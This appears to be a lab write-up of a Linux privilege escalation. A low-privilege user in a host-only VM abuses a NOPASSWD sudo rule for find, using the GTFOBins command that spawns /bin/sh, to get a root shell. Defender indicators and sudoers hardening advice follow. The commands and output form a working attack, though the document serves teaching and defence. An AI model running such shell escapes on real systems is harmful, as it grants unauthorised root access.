# Sudo Misconfiguration

**Date:** July 2026 <br>
**Author:** ShahinSecLab <br>
**Category:** Privilege Escalation <br>
**Difficulty:** Easy <br>
**Tools:** SSH, sudo, find, GTFOBins 

## Table of Contents

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 — Connecting to the Target and Checking Sudo Permissions](#step-1--connecting-to-the-target-and-checking-sudo-permissions)
* [Step 2 — Picking a Binary and Checking GTFOBins](#step-2--picking-a-binary-and-checking-gtfobins)
* [Step 3 — Using find with sudo to Get a Root Shell](#step-3--using-find-with-sudo-to-get-a-root-shell)
* [Step 4 — Confirming Full Root Access](#step-4--confirming-full-root-access)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

Sudo misconfiguration is a common Linux privilege escalation issue. The `sudo` command allows users to run specific commands with root privileges. If these permissions are configured incorrectly, a normal user may be able to run dangerous commands as root.

In this case, the user was allowed to run the `find` binary as root without entering a password. Since `find` can execute commands, it was used to open a root shell and gain full access to the system.

## Attack Flow
```
Connected to the target over SSH with low privilege credentials
                    ↓
Checked sudo permissions with sudo -l
                    ↓
Found a long list of binaries allowed as root with NOPASSWD
                    ↓
Searched GTFOBins for the find binary
                    ↓
Found the Sudo function escape command for find
                    ↓
Ran sudo find . -exec /bin/sh \; -quit
                    ↓
Got a root shell immediately
                    ↓
Confirmed with whoami and id
                    ↓
Checked sudo -l as root — full (ALL) ALL access confirmed
```

## Why This Attack Works

Sudo is meant to let normal users run specific commands as root without giving them full root access. But the problem comes in when the binaries allowed through sudo are not just simple, harmless tools. Many common Linux binaries like find, vim, awk, less, nmap, and man have hidden functions that let them execute shell commands.
If sudo allows a user to run one of these binaries as root, the user can trigger that hidden shell escape function. Since the binary itself is running as root, the shell it spawns is also root — completely bypassing the whole point of sudo restrictions.

## Lab Setup

| Component        | Details                                  |
|------------------|------------------------------------------|
| Attacker Machine | Kali Linux                               |
| Victim Machine   | Debian Linux                             |
| Victim IP        | `192.168.5.133`                            |
| Access Method    | SSH with valid low-privilege credentials |
| Network          | VMware Host-Only Network                 |

## Tools Used

| Tool | Purpose |
|------|---------|
| `SSH` | Used to connect to the target machine |
| `sudo` | Used to check sudo permissions and run commands as root |
| `find` | Used to execute a shell through the sudo permission |
| `GTFOBins` | Used to check the privilege escalation method for `find` |

## Prerequisites

| What | Why |
|------|-----|
| SSH credentials for a low-privilege user | Needed to access the target machine |
| Permission to run `sudo -l` | Needed to check available sudo permissions |
| Misconfigured sudo rule | Required to perform the privilege escalation |
| A binary allowed to run as root | Used to get a root shell |
| Access to GTFOBins | Used to find the correct command for the allowed binary |

## Step 1 — Connecting to the Target and Checking `Sudo` Permissions

### Connected to the Target via SSH

Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
```
**Breakdown**

| Part | Description |
|------|-------------|
| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |

**Output:**

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
user@192.168.5.133's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 30 12:32:04 2026 from 192.168.5.128
```
It prompted for the password right after the connection request, I typed `password321`, and got logged in successfully. The kernel version 2.6.32 stood out right away.

I logged in as `user` — a normal low privilege account on the system.

<p align="center">
  <img src="images/step1-1.png" width="600">
</p>

### Checked `Sudo` Permissions

```bash
user@debian:~$ sudo -l
```
**Output:**

```
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
The output showed that I could run several binaries as root without entering a password. Some of these binaries are listed on GTFOBins because they can be used to escape to a root shell when they are allowed through `sudo`.

<p align="center">
  <img src="images/step1-2.png" width="600">
</p>

## Step 2 — Picking a Binary and Checking GTFOBins

From the list of binaries available through sudo, I selected `find` because it can execute commands and has a known shell escape method.

```bash
(root) NOPASSWD: /usr/bin/find
```
I checked the `find` entry on GTFOBins to see how it could be used with sudo.

The page showed different methods, including Shell, File Write, SUID, and Sudo. Since `find` was allowed to run with sudo, I used the Sudo method to get a root shell.

<p align="center">
  <img src="images/step2-1.png" width="600">
</p>

## Step 3 — Using `find` with `sudo` to Get a Root Shell

GTFOBins gave me the exact command for the Sudo function of `find`:

```bash
find . -exec /bin/sh \; -quit
```

### Ran the Command

```bash
user@debian:~$ sudo find . -exec /bin/sh \; -quit
```
**Breakdown**

| Part | Description |
|------|--------------------------------------------|
| `sudo find` | Runs the `find` command with root privileges |
| `.` | Searches in the current directory |
| `-exec /bin/sh \;` | Runs `/bin/sh` when `find` finds a file |
| `-quit` | Stops `find` after executing the command |

**Output:**

```
sh-4.1#
```
The prompt changed from `user@debian` to `sh-4.1#`, The `#` symbol indicates that the shell was running with root privileges.

## Step 4 — Confirming Full Root Access

I verified the current user with `whoami`:

```bash
sh-4.1# whoami
```
**Output:**

```
root
```
I also checked the user ID:

```bash
sh-4.1# id
```
**Output:**

```
uid=0(root) gid=0(root) groups=0(root)
```
The UID `0` confirms that the current shell is running with root privileges.

<p align="center">
  <img src="images/step4-1.png" width="600">
</p>

A normal user account was able to get full root access because of an incorrect sudo rule that allowed the `find` binary to run as root.

## How Defenders Can Catch This

| Indicator | What to look for |
|-----------|------------------|
| Users with unnecessary sudo permissions | Review sudo access regularly |
| Dangerous binaries allowed through sudo | Check for tools like `find`, `vim`, `awk`, `less`, and `nmap` |
| `NOPASSWD` entries in sudoers | Review `/etc/sudoers` and `/etc/sudoers.d/` |
| Root shell started from a normal user account | Monitor process activity and authentication logs |
| Unexpected sudo usage | Check logs such as `/var/log/auth.log` |

## How to Prevent It

**Never give sudo access to shell-capable binaries unless it is absolutely necessary.**
  Tools such as `find`, `vim`, `awk`, `less`, `man`, `nmap`, and many others can be used to spawn a shell. Before allowing any binary in the `sudoers` file, check whether it appears in GTFOBins.

**Require a password for sudo whenever possible.**
  Avoid using `NOPASSWD` unless there is a valid business or administrative reason. Requiring a password adds an extra layer of security.

**Restrict sudo rules to specific commands and arguments.**
  Instead of allowing users to run an entire binary with `sudo`, limit the rule to only the commands or arguments they actually need by using precise `sudoers` entries.

 **Example:**

  ```bash
  user ALL=(root) NOPASSWD: /usr/bin/find /var/log -type f
  ```
  
**Review sudo permissions regularly.**
  Periodically audit the `sudoers` file to remove unnecessary privileges and ensure users have only the permissions they require.

**Follow the principle of least privilege.**
  Grant only the minimum permissions needed for users to perform their tasks. This reduces the risk of privilege escalation if an account is compromised.

**Audit sudoers file regularly**

```bash
sudo visudo -c
cat /etc/sudoers
ls /etc/sudoers.d/
```

**Check GTFOBins for every binary granted sudo access**
Before granting sudo rights to any tool, search it on gtfobins.github.io to see if it has a known privilege escalation path.

## References

| Resource | Link |
|----------|------|
| **GTFOBins** | https://gtfobins.github.io |
| **GTFOBins — find** | https://gtfobins.github.io/gtfobins/find |
| **Linux sudo man page** | https://www.man7.org/linux/man-pages/man8/sudo.8.html |
| **Sudoers file documentation** | https://www.sudo.ws/docs/man/sudoers.man |
| **MITRE ATT&CK — Sudo and Sudo Caching** | https://attack.mitre.org/techniques/T1548/003 |
| **HackTricks — Sudo Privilege Escalation** | https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid |
| **PayloadsAllTheThings — Sudo Exploitation** | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#sudo-exploitation |

## Lessons Learned

- A single incorrect sudo rule can give a normal user full root access.
- Users should not be allowed to run unnecessary commands as root.
- Avoid giving sudo access to binaries that can execute other commands.
- `NOPASSWD` should only be used when it is really needed.
- Always review sudo permissions and remove unnecessary access.
- Proper sudo configuration helps prevent Linux privilege escalation.